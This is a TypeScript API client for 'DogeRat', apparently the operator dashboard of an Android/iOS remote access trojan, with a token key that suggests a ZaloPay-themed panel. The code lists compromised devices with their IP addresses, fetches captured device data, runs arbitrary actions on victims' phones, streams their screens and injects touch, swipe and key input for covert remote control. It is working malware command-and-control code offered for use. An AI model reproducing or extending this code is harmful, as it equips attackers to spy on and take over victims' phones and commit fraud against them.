// DogeRat API Client
// Provides typed API methods for all DogeRat endpoints

const API_BASE = '/api/v1';

export interface Device {
  id: string;
  device_id: string;
  platform: string;
  platform_version?: string;
  model?: string;
  version?: string;
  ip_address?: string;
  connected_at: string;
  last_seen: string;
  status: 'online' | 'offline';
  metadata?: Record<string, any>;
  device_data?: DeviceData[];
}

export interface DeviceData {
  id: string;
  device_id: string;
  data_type: string;
  data: Record<string, any>;
  metadata?: Record<string, any>;
  captured_at: string;
}

export interface Action {
  name: string;
  description?: string;
  platform?: 'android' | 'ios' | 'both';
  params?: Record<string, any>;
}

export interface ActionRequest {
  action: string;
  params?: Record<string, any>;
}

export interface ActionResponse {
  success: boolean;
  data?: any;
  error?: string;
}

export interface ScreenQuality {
  fps?: number;
  resolution?: 'full' | 'half' | 'quarter';
  compression?: number;
}

export interface ScreenStatus {
  streaming: boolean;
  quality?: ScreenQuality;
  started_at?: string;
}

export interface ControlCommand {
  type: 'touch' | 'swipe' | 'key' | 'scroll';
  data: {
    x?: number;
    y?: number;
    x1?: number;
    y1?: number;
    x2?: number;
    y2?: number;
    key?: string;
    direction?: 'up' | 'down' | 'left' | 'right';
    distance?: number;
  };
}

export interface ControlStatus {
  active: boolean;
  started_at?: string;
  command_count?: number;
}

class DogeRatAPI {
  private async request<T>(
    endpoint: string,
    options: RequestInit = {}
  ): Promise<T> {
    const token = localStorage.getItem('zalopay_admin_token');
    const headers = new Headers(options.headers as HeadersInit);
    headers.set('Content-Type', 'application/json');

    if (token) {
      headers.set('Authorization', `Bearer ${token}`);
    }

    const response = await fetch(`${API_BASE}${endpoint}`, {
      ...options,
      headers,
    });

    if (!response.ok) {
      const error = await response.json().catch(() => ({ error: 'Unknown error' }));
      throw new Error(error.error?.message || error.error || 'Request failed');
    }

    const data = await response.json();
    return data.data || data;
  }

  // Device Management
  async getDevices(filters?: {
    platform?: 'android' | 'ios';
    online?: boolean;
  }): Promise<Device[]> {
    const params = new URLSearchParams();
    if (filters?.platform) params.append('platform', filters.platform);
    if (filters?.online !== undefined) params.append('online', String(filters.online));

    const query = params.toString();
    const endpoint = `/devices${query ? `?${query}` : ''}`;
    
    const response = await this.request<{ success: boolean; data: Device[]; count: number }>(endpoint);
    if (response && 'data' in response) {
      return response.data;
    }
    return Array.isArray(response) ? response : [];
  }

  async getDeviceById(id: string): Promise<Device> {
    const response = await this.request<{ success: boolean; data: Device } | Device>(`/devices/${id}`);
    if (response && 'data' in response) {
      return response.data;
    }
    return response as Device;
  }

  // Actions
  async getAvailableActions(platform?: 'android' | 'ios'): Promise<Action[]> {
    const params = platform ? `?platform=${platform}` : '';
    const response = await this.request<{ success: boolean; data: Action[]; count: number } | Action[]>(`/actions${params}`);
    if (response && 'data' in response) {
      return response.data;
    }
    return Array.isArray(response) ? response : [];
  }

  async executeAction(
    deviceId: string,
    action: string,
    params?: Record<string, any>
  ): Promise<ActionResponse> {
    return this.request<ActionResponse>(`/devices/${deviceId}/action`, {
      method: 'POST',
      body: JSON.stringify({ action, params }),
    });
  }

  // Screen Control
  async startScreenStream(
    deviceId: string,
    quality?: ScreenQuality
  ): Promise<ScreenStatus> {
    return this.request<ScreenStatus>(`/devices/${deviceId}/screen/start`, {
      method: 'POST',
      body: JSON.stringify({ quality }),
    });
  }

  async stopScreenStream(deviceId: string): Promise<{ success: boolean }> {
    return this.request<{ success: boolean }>(
      `/devices/${deviceId}/screen/stop`,
      {
        method: 'POST',
      }
    );
  }

  async updateScreenQuality(
    deviceId: string,
    quality: ScreenQuality
  ): Promise<ScreenStatus> {
    return this.request<ScreenStatus>(
      `/devices/${deviceId}/screen/quality`,
      {
        method: 'POST',
        body: JSON.stringify(quality),
      }
    );
  }

  async getScreenStatus(deviceId: string): Promise<ScreenStatus> {
    return this.request<ScreenStatus>(`/devices/${deviceId}/screen/status`);
  }

  // Remote Control
  async startRemoteControl(deviceId: string): Promise<ControlStatus> {
    return this.request<ControlStatus>(`/devices/${deviceId}/control/start`, {
      method: 'POST',
    });
  }

  async stopRemoteControl(deviceId: string): Promise<{ success: boolean }> {
    return this.request<{ success: boolean }>(
      `/devices/${deviceId}/control/stop`,
      {
        method: 'POST',
      }
    );
  }

  async sendControlCommand(
    deviceId: string,
    command: ControlCommand
  ): Promise<{ success: boolean }> {
    return this.request<{ success: boolean }>(
      `/devices/${deviceId}/control/command`,
      {
        method: 'POST',
        body: JSON.stringify(command),
      }
    );
  }

  async getControlStatus(deviceId: string): Promise<ControlStatus> {
    return this.request<ControlStatus>(`/devices/${deviceId}/control/status`);
  }
}

export const dogeratAPI = new DogeRatAPI();

